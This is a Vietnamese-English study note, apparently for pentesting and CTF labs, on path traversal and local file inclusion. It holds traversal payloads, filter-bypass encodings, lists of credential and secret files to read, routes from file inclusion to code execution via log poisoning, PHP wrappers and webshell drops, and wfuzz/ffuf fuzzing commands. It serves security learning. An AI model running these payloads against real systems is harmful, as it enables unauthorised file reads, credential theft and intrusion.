# Path Traversal / LFI - Practical Overview

## Định nghĩa (ngắn gọn)

- Path Traversal: attacker điều khiển đường dẫn file để đi ra khỏi thư mục dự kiến (`../`, `..\`, absolute path) và đọc/ghi file tùy ý.
- LFI (Local File Inclusion): ứng dụng include/read file local mà attacker có thể tác động đường dẫn.
- RFI (Remote File Inclusion): include file từ remote URL (thường chỉ khả thi khi cấu hình nguy hiểm, ví dụ `allow_url_include=On` trong PHP).

## Nguyên nhân gốc (root cause)

- User input đi thẳng vào filesystem API (`open`, `include`, `readfile`, `file_get_contents`, ...).
- Chỉ filter chuỗi đơn giản (`replace('../','')`) thay vì canonicalization + allowlist.
- Validate sai thứ tự: filter trước, decode sau (double decode bug).
- Chỉ check prefix/suffix (bắt buộc bắt đầu `/var/www/images` hoặc kết thúc `.png`) nhưng không check canonical path.
- Ghép path sai trong code (`os.path.join(base, user_input)` với absolute path sẽ bỏ qua `base`).

## Tác động thực tế

- Source code disclosure: lộ logic auth, endpoint ẩn, API key.
- Credential leak: `/etc/passwd`, config DB, secret token, SSH key, cloud token.
- Session/token hijack: đọc access log, lấy token trên URL, replay session.
- Lateral movement: đọc env/process (`/proc/self/environ`, `/proc/self/cmdline`).
- RCE chain: log poisoning, wrapper abuse (`php://input`, `data://`, `zip://`), file write traversal -> webshell.

## End-to-End Attack Path

### 1. Detection

- Xác định sink có khả năng đọc/include file:
  - Query params: `file`, `filename`, `path`, `page`, `template`, `download`, `doc`, `folder`, `include`, ...
  - Endpoint đang đọc tài nguyên: `loadImage`, `download`, `view`, `export`, `log`, `template`, `render`.
- Chụp baseline response (status, length, headers, body snippet) trước khi tấn công.

### 2. Initial Payload Test (quick win)

- Linux:
  - `../../../etc/passwd`
  - `/etc/passwd`
- Windows:
  - `..\..\..\windows\win.ini`
  - `C:\Windows\win.ini`
- Prefix constrained:
  - `/var/www/images/../../../etc/passwd`

### 3. Bypass khi bị chặn

- Traversal bị strip: `....//....//etc/passwd`, `....\/....\/etc/passwd`.
- Decode mismatch:
  - `%2e%2e%2f`
  - `%252e%252e%252f`
  - `..%c0%af`
- Reverse proxy parser mismatch: `..;/` (NGINX/Tomcat case).
- Extension check (`.png`): `../../../etc/passwd%00.png` (legacy), hoặc kiểm tra biến thể đường dẫn hợp lệ theo stack.
- Client tự normalize path: dùng `curl --path-as-is`.

### 4. Exploit (File Read -> Data Loot)

- Ưu tiên file giá trị cao:
  - Linux: `/etc/passwd`, `/etc/shadow`, `/etc/hosts`, `/proc/self/environ`, `/proc/self/cmdline`.
  - Logs: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`, `/var/log/httpd/error_log`.
  - Web config/source: `web.config`, `.env`, `config.php`, app source qua `/proc/self/cwd/...`.
  - Container/K8s: `/run/secrets/kubernetes.io/serviceaccount/token`.

### 5. Pivot sang RCE (nếu điều kiện cho phép)

- Log poisoning -> include log.
- Include `/proc/self/environ` sau khi bơm payload vào `User-Agent`.
- `php://input` + POST PHP payload.
- `data://` / `expect://` / `zip://` / `phar://` (tùy config/runtime).
- Arbitrary file write via traversal -> drop webshell vào webroot.

### 6. Tự động hóa wordlist

- Dùng `wordlist.txt` để fuzz theo giai đoạn:
  - Confirm vuln (payload ngắn, high-signal).
  - Expand depth (`../` nhiều mức).
  - Targeted loot (logs, config, proc, windows).
- Ví dụ wfuzz:

```bash
wfuzz -c -w "_knowledge_base/Web/Path traversal/reference/LFI-LFISuite-pathtotest.txt" --hw 0 "http://TARGET/vuln.php?page=FUZZ"
```

- Ví dụ ffuf:

```bash
ffuf -u "http://TARGET/loadImage?filename=FUZZ" -w "_knowledge_base/Web/Path traversal/reference/LFI-LFISuite-pathtotest.txt" -mc all -fs 0
```

## Playbook step-by-step (PortSwigger/CTF first)

1. Xác định endpoint có `filename/path/page/file`.
2. Gửi baseline request và ghi lại body length.
3. Thử 4 payload đầu tay: `../../../etc/passwd`, `/etc/passwd`, `....//....//etc/passwd`, `%252e%252e%252fetc%252fpasswd`.
4. Nếu fail, đổi separator (`/` <-> `\`) và đổi OS target (`/etc/passwd` <-> `C:\Windows\win.ini`).
5. Khi đọc được file đầu tiên, đổi sang file giá trị cao (config, log, env, source).
6. Nếu có include executable, test chain LFI->RCE (log poison/php://input).
7. Tự động hóa với wordlist full + lọc response khác baseline.
8. Chốt bằng bằng chứng: request, response snippet, impact thực tế, hướng khai thác tiếp.

## Decision tree (nếu bị chặn -> thử gì tiếp)

- Nếu `../` bị block:
  - Thử absolute path (`/etc/passwd`, `C:\Windows\win.ini`).
  - Thử nested traversal (`....//`).
  - Thử URL-encoding/double-encoding.
- Nếu app bắt buộc prefix path:
  - Giữ prefix rồi traversal (`/var/www/images/../../../etc/passwd`).
- Nếu app bắt buộc extension:
  - Thử `%00` (legacy) hoặc tìm parser mismatch/path normalization bug.
- Nếu response không hiện file content rõ ràng:
  - Thử pseudo file (`/proc/self/environ`) + `curl --path-as-is`.
  - Thử blind techniques (error oracle với php filter, nếu stack cho phép).
- Nếu chỉ đọc được file text và chưa RCE:
  - Ưu tiên leak secrets/token/config để takeover.
  - Thử log poisoning/session file/include temp upload để pivot.
- Nếu fuzz full list quá nhiều noise:
  - Lọc theo status/size/word count.
  - Tách wordlist theo Linux/Windows/logs/proc rồi fuzz lại.
